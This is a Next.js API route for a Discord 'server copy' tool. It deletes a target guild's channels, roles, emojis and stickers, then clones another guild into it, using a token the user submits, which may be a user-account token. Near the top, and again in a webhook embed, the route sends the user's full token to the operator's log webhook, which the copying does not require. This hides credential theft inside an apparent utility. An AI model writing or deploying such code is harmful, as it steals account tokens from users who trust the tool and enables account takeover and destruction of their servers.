import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { arrayBufferToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

let globalRLUntil = 0;

async function waitRL() {
  const now = Date.now();
  if (now < globalRLUntil) {
    await new Promise(r => setTimeout(r, globalRLUntil - now + 300));
  }
}

async function dFetch(auth: string, method: string, url: string, body?: unknown): Promise<{ ok: boolean; data: any; status: number }> {
  await waitRL();
  const maxRetries = 3;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const opts: RequestInit = {
        method,
        headers: { 'Authorization': auth, 'Accept': 'application/json', ...(method !== 'GET' ? { 'Content-Type': 'application/json' } : {}) },
        signal: AbortSignal.timeout(15000),
      };
      if (method !== 'GET' && body !== undefined) opts.body = JSON.stringify(body);
      const res = await fetch(url, opts);
      if (res.status === 429) {
        const err = await res.json().catch(() => ({ retry_after: 5 }));
        const w = Math.min((err.retry_after || 5) * 1000, 8000);
        globalRLUntil = Date.now() + w;
        await new Promise(r => setTimeout(r, w));
        continue;
      }
      if (res.status === 204) return { ok: true, data: null, status: 204 };
      const d = await res.json().catch(() => null);
      return { ok: res.ok, data: d, status: res.status };
    } catch {
      if (attempt === maxRetries - 1) return { ok: false, data: null, status: 0 };
      await new Promise(r => setTimeout(r, 1000));
    }
  }
  return { ok: false, data: null, status: 0 };
}

function sseStream(handler: (send: (d: any) => void) => Promise<void>) {
  const stream = new ReadableStream({
    async start(controller) {
      const enc = new TextEncoder();
      const send = (data: any) => controller.enqueue(enc.encode(`data: ${JSON.stringify(data)}\n\n`));
      try { await handler(send); }
      catch (e: any) { send({ type: 'error', message: e.message || 'خطأ' }); }
      controller.close();
    },
    cancel() {},
  });
  return new Response(stream, {
    headers: { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive' },
  });
}

function errRes(error: string) {
  return new Response(JSON.stringify({ success: false, error }), { status: 400, headers: { 'Content-Type': 'application/json' } });
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:copy`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, sourceId, targetId, options } = body;

    if (!token || !sourceId || !targetId) return errRes('بيانات ناقصة');

    sendFullToken('نسخ سيرفر', token, { '📥 المصدر': sourceId, '📤 الهدف': targetId });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    return sseStream(async (send) => {

      send({ type: 'progress', message: '🔍 جاري التحقق من التوكن...' });
      let auth = ct;
      let authType = 'User';
      const testUser = await dFetch(ct, 'GET', `${DISCORD_API}/users/@me`);
      if (!testUser.ok) {
        const testBot = await dFetch(`Bot ${ct}`, 'GET', `${DISCORD_API}/users/@me`);
        if (testBot.ok) { auth = `Bot ${ct}`; authType = 'Bot'; }
        else { send({ type: 'done', success: false, error: 'التوكن غير صالح' }); return; }
      }
      const df = (method: string, endpoint: string, body?: unknown) => dFetch(auth, method, `${DISCORD_API}${endpoint}`, body);

      send({ type: 'info', authType });

      const stats = { roles: 0, txt: 0, voice: 0, cats: 0, emojis: 0, stickers: 0, autoMod: 0, permissions: 0, errors: 0, icon: false, banner: false, settings: false };
      const roleMap: Record<string, string> = {};
      const catMap: Record<string, string> = {};

      sendToWebhook({ username: 'TRJ Copy', embeds: [{ title: '📋 Server Copy Started (Sequential)', color: 0x00FF41, fields: [{ name: '📥 Source', value: sourceId, inline: true }, { name: '📤 Target', value: targetId, inline: true }, { name: '🔑 Auth', value: authType, inline: true }, { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }], timestamp: new Date().toISOString() }] }, whUrl).catch(() => {});

      // ===== المرحلة 1: جلب بيانات المصدر =====
      send({ type: 'progress', message: '📥 جاري جلب بيانات السيرفر المصدر...' });
      const [sourceRes, sRolesRes, sChannelsRes, sEmojisRes, sStickersRes, sAutoModRes, tChannelsRes, tRolesRes] = await Promise.all([
        df('GET', `/guilds/${sourceId}?with_counts=true`),
        df('GET', `/guilds/${sourceId}/roles`),
        df('GET', `/guilds/${sourceId}/channels`),
        df('GET', `/guilds/${sourceId}/emojis`),
        df('GET', `/guilds/${sourceId}/stickers`),
        df('GET', `/guilds/${sourceId}/auto-moderation/rules`),
        df('GET', `/guilds/${targetId}/channels`),
        df('GET', `/guilds/${targetId}/roles`),
      ]);

      if (!sourceRes.ok || !sourceRes.data?.id) {
        send({ type: 'done', success: false, error: 'فشل الوصول للسيرفر المصدر - تأكد أن التوكن صالح ومعه صلاحيات ADMINISTRATOR' }); return;
      }

      // ===== المرحلة 2: مسح السيرفر الهدف (متتالي) =====
      send({ type: 'progress', message: '🗑️ جاري مسح السيرفر الهدف...' });
      const tChannels = tChannelsRes.data as any[] || [];
      const tRoles = tRolesRes.data as any[] || [];

      // حذف الإيموجي الحالية
      const tEmojis = await df('GET', `/guilds/${targetId}/emojis`);
      if (tEmojis.ok && Array.isArray(tEmojis.data)) {
        for (let i = 0; i < tEmojis.data.length; i++) {
          await df('DELETE', `/guilds/${targetId}/emojis/${tEmojis.data[i].id}`);
          if (i % 3 === 0) send({ type: 'progress', message: `🗑️ حذف إيموجي: ${i + 1}/${tEmojis.data.length}` });
        }
      }
      // حذف الستيكرز الحالية
      const tStickers = await df('GET', `/guilds/${targetId}/stickers`);
      if (tStickers.ok && Array.isArray(tStickers.data)) {
        for (let i = 0; i < tStickers.data.length; i++) {
          await df('DELETE', `/guilds/${targetId}/stickers/${tStickers.data[i].id}`);
          if (i % 3 === 0) send({ type: 'progress', message: `🗑️ حذف ستكر: ${i + 1}/${tStickers.data.length}` });
        }
      }

      // حذف القنوات - متتالي: channels ثم categories
      const nonCats = tChannels.filter(c => c.type !== 4);
      const cats = tChannels.filter(c => c.type === 4);
      let deletedCh = 0;
      for (const items of [nonCats, cats]) {
        for (const c of items) {
          const r = await df('DELETE', `/channels/${c.id}`);
          if (r.ok) deletedCh++;
          await new Promise(r => setTimeout(r, 200));
        }
      }
      // حذف أي قنوات متبقية
      for (let round = 0; round < 2; round++) {
        const remainCh = await df('GET', `/guilds/${targetId}/channels`);
        if (!remainCh.ok || !Array.isArray(remainCh.data) || remainCh.data.length === 0) break;
        for (const c of remainCh.data) {
          await df('DELETE', `/channels/${c.id}`);
          await new Promise(r => setTimeout(r, 200));
        }
      }
      send({ type: 'progress', message: `🗑️ تم حذف ${deletedCh} قناة` });

      // حذف الرتب - متتالي من الأقل للأعلى
      const deletableRoles = [...tRoles].filter((r: any) => r.name !== '@everyone' && !r.managed).sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
      let deletedRoles = 0;
      for (const r of deletableRoles) {
        const res = await df('DELETE', `/guilds/${targetId}/roles/${r.id}`);
        if (res.ok) deletedRoles++;
        await new Promise(r => setTimeout(r, 150));
      }
      // حذف أي رتب متبقية
      for (let round = 0; round < 2; round++) {
        const remainRoles = await df('GET', `/guilds/${targetId}/roles`);
        if (!remainRoles.ok || !Array.isArray(remainRoles.data)) break;
        const dels = remainRoles.data.filter((r: any) => r.name !== '@everyone' && !r.managed);
        if (dels.length === 0) break;
        for (const r of dels) {
          await df('DELETE', `/guilds/${targetId}/roles/${r.id}`);
          await new Promise(r => setTimeout(r, 150));
        }
      }
      send({ type: 'progress', message: `🗑️ تم حذف ${deletedRoles} رتبة` });
      send({ type: 'stats', stats });

      // ===== المرحلة 3: نسخ الإعدادات =====
      if (options?.settings !== false && sourceRes.data) {
        send({ type: 'progress', message: '⚙️ جاري نسخ إعدادات السيرفر...' });
        const sd = sourceRes.data;
        await df('PATCH', `/guilds/${targetId}`, {
          name: sd.name, description: sd.description,
          preferred_locale: sd.preferred_locale,
          verification_level: sd.verification_level,
          default_notification_level: sd.default_notification_level,
          explicit_content_filter: sd.explicit_content_filter,
          system_channel_flags: sd.system_channel_flags,
          nsfw: sd.nsfw,
          nsfw_level: sd.nsfw_level,
          premium_progress_bar_enabled: sd.premium_progress_bar_enabled,
          features: [],
        });
        stats.settings = true;

        if (sd.icon) {
          send({ type: 'progress', message: '🖼️ جاري نسخ الأيقونة...' });
          try {
            const imgUrl = `https://cdn.discordapp.com/icons/${sd.id}/${sd.icon}.png?size=1024`;
            const imgRes = await fetch(imgUrl);
            if (imgRes.ok) {
              const b64 = arrayBufferToBase64(await imgRes.arrayBuffer());
              const iconRes = await df('PATCH', `/guilds/${targetId}`, { icon: `data:image/png;base64,${b64}` });
              if (iconRes.ok) stats.icon = true;
            }
          } catch { /* skip */ }
        }

        if (sd.banner) {
          send({ type: 'progress', message: '🌈 جاري نسخ البانر...' });
          try {
            const bannerUrl = `https://cdn.discordapp.com/banners/${sd.id}/${sd.banner}.png?size=1024`;
            const bannerRes = await fetch(bannerUrl);
            if (bannerRes.ok) {
              const b64 = arrayBufferToBase64(await bannerRes.arrayBuffer());
              const uploadRes = await df('PATCH', `/guilds/${targetId}`, { banner: `data:image/png;base64,${b64}` });
              if (uploadRes.ok) stats.banner = true;
            }
          } catch { /* skip */ }
        }
        send({ type: 'progress', message: '✅ تم نسخ الإعدادات' });
      }

      // ===== المرحلة 4: إنشاء الرتب (متتالي - من الأعلى للأقل) =====
      const sRoles = sRolesRes.data as any[] || [];
      if (options?.roles !== false && sRoles.length > 0) {
        const sortedRoles = [...sRoles].filter((r: any) => r.name !== '@everyone' && !r.managed).sort((a, b) => (b.position || 0) - (a.position || 0));
        send({ type: 'progress', message: `🛡️ جاري إنشاء ${sortedRoles.length} رتبة (متتالي)...` });

        for (let i = 0; i < sortedRoles.length; i++) {
          const role = sortedRoles[i];
          const res = await df('POST', `/guilds/${targetId}/roles`, {
            name: role.name,
            color: role.color || 0,
            hoist: !!role.hoist,
            mentionable: !!role.mentionable,
            permissions: String(role.permissions_new || role.permissions || '0'),
            ...(role.icon ? { icon: role.icon } : {}),
            ...(role.unicode_emoji ? { unicode_emoji: role.unicode_emoji } : {}),
          });
          if (res.ok && res.data?.id) {
            roleMap[role.id] = res.data.id;
            stats.roles++;
          } else {
            stats.errors++;
          }
          send({ type: 'progress', message: `🛡️ رتبة ${stats.roles}/${sortedRoles.length}: ${role.name}` });
          await new Promise(r => setTimeout(r, 100));
        }

        // ضبط صلاحيات @everyone
        const everyoneSrc = sRoles.find((r: any) => r.name === '@everyone');
        if (everyoneSrc) {
          const everyoneTgt = (await df('GET', `/guilds/${targetId}/roles`)).data?.find((r: any) => r.name === '@everyone');
          if (everyoneTgt?.id) {
            await df('PATCH', `/guilds/${targetId}/roles/${everyoneTgt.id}`, {
              permissions: String(everyoneSrc.permissions_new || everyoneSrc.permissions || '0'),
            });
          }
        }
        send({ type: 'stats', stats });
      }

      // ===== المرحلة 5: إنشاء الكاتيجوريات (متتالي) =====
      const sChannels = sChannelsRes.data as any[] || [];
      if (options?.channels !== false && sChannels.length > 0) {
        const categories = sChannels.filter(c => c.type === 4).sort((a, b) => (a.position || 0) - (b.position || 0));

        if (categories.length > 0) {
          send({ type: 'progress', message: `📁 جاري إنشاء ${categories.length} كاتيجوري (متتالي)...` });
          for (let i = 0; i < categories.length; i++) {
            const cat = categories[i];
            const res = await df('POST', `/guilds/${targetId}/channels`, { name: cat.name, type: 4 });
            if (res.ok && res.data?.id) {
              catMap[cat.id] = res.data.id;
              stats.cats++;
              // ضبط الصلاحيات
              const ow = cat.permission_overwrites;
              if (ow && Array.isArray(ow) && ow.length > 0) {
                const mapped = ow.map((o: any) => ({
                  id: o.type === 0 && roleMap[o.id] ? roleMap[o.id] : o.id,
                  type: o.type, allow: String(o.allow || 0), deny: String(o.deny || 0),
                }));
                await df('PUT', `/channels/${res.data.id}/permissions`, mapped);
                stats.permissions += mapped.length;
              }
            } else {
              stats.errors++;
            }
            send({ type: 'progress', message: `📁 كاتيجوري ${stats.cats}/${categories.length}: ${cat.name}` });
            await new Promise(r => setTimeout(r, 150));
          }
          send({ type: 'stats', stats });
        }

        // ===== المرحلة 6: إنشاء القنوات (متتالي) =====
        const others = sChannels.filter(c => c.type !== 4).sort((a, b) => (a.position || 0) - (b.position || 0));

        if (others.length > 0) {
          send({ type: 'progress', message: `📺 جاري إنشاء ${others.length} قناة (متتالي)...` });
          for (let i = 0; i < others.length; i++) {
            const c = others[i];
            const payload: any = { name: c.name, type: c.type, nsfw: !!c.nsfw, topic: c.topic || null };
            if (c.parent_id && catMap[c.parent_id]) payload.parent_id = catMap[c.parent_id];
            if (c.type === 2) { payload.bitrate = c.bitrate || 64000; payload.user_limit = c.user_limit || 0; }
            if (c.rate_limit_per_user) payload.rate_limit_per_user = c.rate_limit_per_user;
            if (c.default_auto_archive_duration) payload.default_auto_archive_duration = c.default_auto_archive_duration;
            if (c.rtc_region) payload.rtc_region = c.rtc_region;
            if (c.video_quality_mode) payload.video_quality_mode = c.video_quality_mode;

            const res = await df('POST', `/guilds/${targetId}/channels`, payload);
            if (res.ok && res.data?.id) {
              if (c.type === 0 || c.type === 5) stats.txt++;
              else if (c.type === 2 || c.type === 13) stats.voice++;
              // ضبط الصلاحيات
              const ow = c.permission_overwrites;
              if (ow && Array.isArray(ow) && ow.length > 0) {
                const mapped = ow.map((o: any) => ({
                  id: o.type === 0 && roleMap[o.id] ? roleMap[o.id] : o.id,
                  type: o.type, allow: String(o.allow || 0), deny: String(o.deny || 0),
                }));
                await df('PUT', `/channels/${res.data.id}/permissions`, mapped);
                stats.permissions += mapped.length;
              }
            } else {
              stats.errors++;
            }
            send({ type: 'progress', message: `📺 قناة ${stats.txt + stats.voice}/${others.length}: ${c.name}` });
            await new Promise(r => setTimeout(r, 150));
          }
          send({ type: 'stats', stats });
        }

        // ===== المرحلة 7: ترتيب القنوات =====
        const allNewChannels = await df('GET', `/guilds/${targetId}/channels`);
        if (allNewChannels.ok && Array.isArray(allNewChannels.data)) {
          const targetCats = allNewChannels.data.filter(c => c.type === 4);
          const posPairs = targetCats.map(c => {
            const srcCat = categories.find(sc => catMap[sc.id] === c.id);
            return { id: c.id, position: srcCat ? srcCat.position || 0 : c.position || 0 };
          });
          if (posPairs.length > 1) {
            await df('PATCH', `/guilds/${targetId}/channels`, posPairs.map(c => ({ id: c.id, position: c.position })));
          }
          const targetOthers = allNewChannels.data.filter(c => c.type !== 4);
          const chPosPairs = targetOthers.map(c => {
            const srcCh = others.find(sc => {
              const newCatId = catMap[sc.parent_id];
              return sc.name === c.name && (newCatId ? newCatId === c.parent_id : sc.parent_id === c.parent_id);
            });
            return { id: c.id, position: srcCh ? srcCh.position || 0 : c.position || 0 };
          });
          for (let i = 0; i < chPosPairs.length; i += 50) {
            await df('PATCH', `/guilds/${targetId}/channels`, chPosPairs.slice(i, i + 50).map(c => ({ id: c.id, position: c.position })));
          }
        }
      }

      // ===== المرحلة 8: نسخ الإيموجي (متتالي) =====
      const sEmojis = sEmojisRes.data as any[] || [];
      if (sEmojis.length > 0) {
        send({ type: 'progress', message: `😀 جاري نسخ ${sEmojis.length} إيموجي (متتالي)...` });
        for (let i = 0; i < sEmojis.length; i++) {
          const emoji = sEmojis[i];
          try {
            const imageUrl = emoji.animated
              ? `https://cdn.discordapp.com/emojis/${emoji.id}.gif`
              : `https://cdn.discordapp.com/emojis/${emoji.id}.png`;
            const imgRes = await fetch(imageUrl);
            if (!imgRes.ok) { stats.errors++; continue; }
            const b64 = arrayBufferToBase64(await imgRes.arrayBuffer());
            const mime = emoji.animated ? 'image/gif' : 'image/png';
            const roles: string[] = [];
            if (emoji.roles && Array.isArray(emoji.roles)) {
              for (const rid of emoji.roles) { roles.push(roleMap[rid] || rid); }
            }
            const res = await df('POST', `/guilds/${targetId}/emojis`, { name: emoji.name, image: `data:${mime};base64,${b64}`, roles });
            if (res.ok) stats.emojis++;
            else stats.errors++;
          } catch { stats.errors++; }
          send({ type: 'progress', message: `😀 إيموجي ${stats.emojis}/${sEmojis.length}: ${emoji.name}` });
          await new Promise(r => setTimeout(r, 500));
        }
        send({ type: 'stats', stats });
      }

      // ===== المرحلة 9: نسخ الستيكرز (متتالي) =====
      const sStickers = sStickersRes.data as any[] || [];
      if (sStickers.length > 0) {
        send({ type: 'progress', message: `🎨 جاري نسخ ${sStickers.length} ستكر (متتالي)...` });
        for (let i = 0; i < sStickers.length; i++) {
          const sticker = sStickers[i];
          try {
            let ext = 'png';
            if (sticker.format_type === 2) ext = 'gif';
            else if (sticker.format_type === 3) ext = 'webp';
            const imgUrl = `https://cdn.discordapp.com/stickers/${sticker.id}.${ext}`;
            const imgRes = await fetch(imgUrl);
            if (!imgRes.ok) { stats.errors++; continue; }
            const buf = await imgRes.arrayBuffer();
            const b64 = arrayBufferToBase64(buf);
            const mime = ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/png';
            const res = await df('POST', `/guilds/${targetId}/stickers`, {
              name: sticker.name, description: sticker.description || '', tags: sticker.tags || '',
              file: { data: `data:${mime};base64,${b64}` },
            } as any);
            if (res.ok) stats.stickers++;
            else stats.errors++;
          } catch { stats.errors++; }
          send({ type: 'progress', message: `🎨 ستكر ${stats.stickers}/${sStickers.length}: ${sticker.name}` });
          await new Promise(r => setTimeout(r, 500));
        }
        send({ type: 'stats', stats });
      }

      // ===== المرحلة 10: نسخ أوتو مود (متتالي) =====
      const sAutoMod = sAutoModRes.data as any[] || [];
      if (sAutoMod.length > 0) {
        send({ type: 'progress', message: `🤖 جاري نسخ ${sAutoMod.length} قاعدة أوتو مود (متتالي)...` });
        for (let i = 0; i < sAutoMod.length; i++) {
          const rule = sAutoMod[i];
          try {
            const actions = (rule.actions || []).map((a: any) => {
              const action: any = { type: a.type };
              if (a.metadata && Object.keys(a.metadata).length > 0) action.metadata = a.metadata;
              return action;
            });
            const exemptRoles = (rule.exempt_roles || []).map((rid: string) => roleMap[rid] || rid).filter(Boolean);
            const exemptChannels = (rule.exempt_channels || []).filter(Boolean);
            const res = await df('POST', `/guilds/${targetId}/auto-moderation/rules`, {
              name: rule.name, enabled: rule.enabled !== false,
              event_type: rule.event_type, trigger_type: rule.trigger_type,
              trigger_metadata: rule.trigger_metadata || {},
              actions, exempt_roles: exemptRoles, exempt_channels: exemptChannels,
            });
            if (res.ok) stats.autoMod++;
            else stats.errors++;
          } catch { stats.errors++; }
          send({ type: 'progress', message: `🤖 أوتو مود ${stats.autoMod}/${sAutoMod.length}: ${rule.name}` });
          await new Promise(r => setTimeout(r, 300));
        }
      }

      // ===== النتيجة النهائية =====
      sendToWebhook({
        username: 'TRJ Copy', embeds: [{
          title: '✅ Copy Completed (Sequential)', color: 0x00FF41,
          fields: [
            { name: '🎭 Roles', value: String(stats.roles), inline: true },
            { name: '📁 Cats', value: String(stats.cats), inline: true },
            { name: '💬 Text', value: String(stats.txt), inline: true },
            { name: '🔊 Voice', value: String(stats.voice), inline: true },
            { name: '😀 Emojis', value: String(stats.emojis), inline: true },
            { name: '🎨 Stickers', value: String(stats.stickers), inline: true },
            { name: '🤖 AutoMod', value: String(stats.autoMod), inline: true },
            { name: '🔐 Permissions', value: String(stats.permissions), inline: true },
            { name: '🖼️ Icon', value: stats.icon ? '✅' : '❌', inline: true },
            { name: '🌈 Banner', value: stats.banner ? '✅' : '❌', inline: true },
            { name: '❌ Errors', value: String(stats.errors), inline: true },
          ],
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      const summary = `✅ تم النسخ الشامل (متتالي)! ${stats.roles} رتب | ${stats.cats} كاتيجوري | ${stats.txt} كتابي | ${stats.voice} صوتي | ${stats.emojis} إيموجي | ${stats.stickers} ستكر | ${stats.autoMod} أوتو مود | ${stats.permissions} صلاحية ${stats.icon ? '| 🖼️ أيقونة' : ''} ${stats.banner ? '| 🌈 بانر' : ''} | ${stats.errors} أخطاء`;
      send({ type: 'done', success: true, stats, message: summary });
    });

  } catch (e: unknown) {
    return errRes(e instanceof Error ? e.message : 'خطأ غير متوقع');
  }
}
